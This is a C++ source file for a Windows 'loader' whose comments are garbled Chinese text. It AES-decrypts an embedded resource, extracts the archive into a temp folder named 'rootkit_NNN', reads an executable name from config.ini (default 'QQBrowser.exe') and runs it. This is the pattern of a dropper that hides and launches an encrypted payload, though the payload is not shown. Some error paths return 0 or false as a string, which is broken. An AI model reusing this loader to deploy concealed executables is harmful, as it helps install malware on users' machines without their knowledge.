// loader.cpp : Defines the entry point for the application.
//
#include "stdafx.h"
#include "resource.h"
#include "AESEncryption.h"
#include "zip\unzip.h"
#include "loaderUtils.h"

#include <string>
#include <Shlwapi.h>

#pragma comment(lib,"Shlwapi.lib")

std::wstring releaseFilesFromResource(HINSTANCE hInstance) {
	HRSRC hResInfo = FindResource(hInstance, MAKEINTRESOURCE(IDR_MAGIC2), _T("magic"));
	if (hResInfo == NULL)
		return 0;

	HGLOBAL hRes = LoadResource(hInstance, hResInfo);
	if (hRes == NULL)
		return 0;

	//�ҵ���������Դ
	LPVOID Data = LockResource(hRes);
	//��Դ��С
	DWORD nSize = SizeofResource(hInstance, hResInfo);

	BYTE* lpData = new BYTE[nSize];
	ZeroMemory(lpData, nSize*sizeof(BYTE));
	CAESEncryption aes;
	if (false == aes.Decryption(Data, nSize, lpData))
		return false;

	//������Դ
	UnlockResource(hRes);
	//�ͷ���Դ
	FreeResource(hRes);

	/*char Info[4];	//������ͷ�����ֽ���Ϊ��־λ
	char Orgi[4];
	memcpy(Info, lpData, 4);
	Orgi[0] = 0x50;
	Orgi[1] = 0x4b;
	Orgi[2] = 0x03;
	Orgi[3] = 0x04;
	memcpy(lpData, Orgi, 4);	//��ԭZIP���ļ�ͷ
	*/
	//��û�������TEMP�ľ���·��
	TCHAR tempPath[MAX_PATH] = { 0 };
	TCHAR tempDir[MAX_PATH] = { 0 };
	//TCHAR tcCmdLine[1024] = {0};
	GetEnvironmentVariable(_T("TEMP"), tempPath, MAX_PATH);
	BOOL bStop = FALSE;
	while (!bStop)
	{
		static int index = 0;
		_stprintf_s(tempDir, _T("%s\\rootkit_%03d\\"), tempPath, index);
		if (CLoaderUtils::IsDirectory(tempDir))
		{
			++index;
			continue;
		}
		::CreateDirectory(tempDir, NULL);
		if (!CLoaderUtils::IsDirectory(tempDir))
			continue;

		bStop = TRUE;
	}

	//��ZIP�ļ���ʽ�����������Ч�򷵻ؿվ��
	HZIP hZip = OpenZip(lpData, nSize, NULL);
	//�����ļ��ĵ�ǰĿ¼Ϊ��Ŀ¼
	SetUnzipBaseDir(hZip, _T("\\"));
	ZIPENTRY ze;
	//��õ�ȫ�����ļ�������
	GetZipItem(hZip, -1, &ze);
	int numitems = ze.index;	//�ļ�����
	UINT ExeNum = 0;
	for (int zi = 0; zi < numitems; zi++)
	{
		//ѭ�����ÿһ���ļ�����Ϣ
		GetZipItem(hZip, zi, &ze);

		TCHAR file_name[MAX_PATH] = { 0 };		//�����ļ���
		_stprintf_s(file_name, _T("%s%s"), tempDir, ze.name);

		//��ѹ��
		ZRESULT ret = UnzipItem(hZip, zi, file_name);
		while (ret != 0)
		{
			ret = UnzipItem(hZip, zi, file_name);
		}
	}

	//�رվ��
	CloseZip(hZip);

	return tempDir;
}

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	std::wstring fileDir = releaseFilesFromResource(hInstance);

	std::wstring str_config = fileDir + _T("config.ini");
	TCHAR szBuffer[MAX_PATH] = { 0 };
	GetPrivateProfileString(_T("data"), _T("start_process"), _T("QQBrowser.exe"), szBuffer, MAX_PATH, str_config.c_str());
	OutputDebugString(szBuffer);
	std::wstring strStartProcess = fileDir + szBuffer;
	OutputDebugString(strStartProcess.c_str());
	if (PathFileExists(strStartProcess.c_str()))
	{
		CLoaderUtils::Execute(strStartProcess.c_str(), _T(""), fileDir.c_str(), FALSE, TRUE);
	}
	
	return 0;
}
